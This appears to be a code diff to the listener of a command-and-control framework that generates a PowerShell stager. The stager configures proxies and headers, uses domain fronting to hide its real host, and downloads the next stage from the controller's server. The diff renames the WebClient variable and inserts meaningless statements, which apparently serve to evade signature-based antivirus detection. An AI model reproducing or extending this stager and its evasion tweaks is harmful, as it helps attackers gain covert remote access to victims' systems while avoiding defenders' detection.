@@ -282,21 +282,21 @@ class Listener:
             # code to turn the key string into a byte array
             stager += f"$Kk=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
             
-            stager += "$wc=New-Object System.Net.WebClient;"
+            stager += "$talk=New-Object System.Net.WebClient;"
             stager += "$f1=1 + 2 * 3;"
             if userAgent.lower() != "none":
-                stager += "$wc.Headers.Add('User-Agent',$aua);"
+                stager += "$talk.Headers.Add('User-Agent',$aua);"
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
+                        stager += "$talk.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                     else:
                         # TODO: implement form for other proxy
-                        stager += f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');$wc.Proxy = $proxy;"
+                        stager += f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');$talk.Proxy = $proxy;"
 
                     if proxyCreds.lower() != "none":
                         if proxyCreds.lower() == "default":
-                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+                            stager += "$talk.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                         else:
                             # TODO: implement form for other proxy credentials
@@ -311,10 +311,10 @@ class Listener:
                                 usr = username.split("\\")[0]
                                 stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }');"
 
-                            stager += "$wc.Proxy.Credentials = $netcred;"
+                            stager += "$talk.Proxy.Credentials = $netcred;"
 
                     # save the proxy settings to use during the entire staging process and the agent
-                    stager += "$Script:Proxy = $wc.Proxy;"
+                    stager += "$Script:Proxy = $talk.Proxy;"
 
             # TODO: reimplement stager retries?
             # check if we're using IPv6
@@ -350,14 +350,14 @@ class Listener:
                     # If host header defined, assume domain fronting is in use and add a call to the base URL first
                     # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                     if headerKey.lower() == "host":
-                        stager += "try{$ig=$wc.DownloadData($hom)}catch{};"
+                        stager += "try{$ig=$talk.DownloadData($hom)}catch{};"
                     stager += (
-                        "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
+                        "$talk.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
                     )
 
             # add the RC4 packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
-            stager += "$mdata=$wc.DownloadData($hom+$t);"
+            stager += f'$talk.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
+            stager += "$mdata=$talk.DownloadData($hom+$t);"
             stager += "$iv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
             
             stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
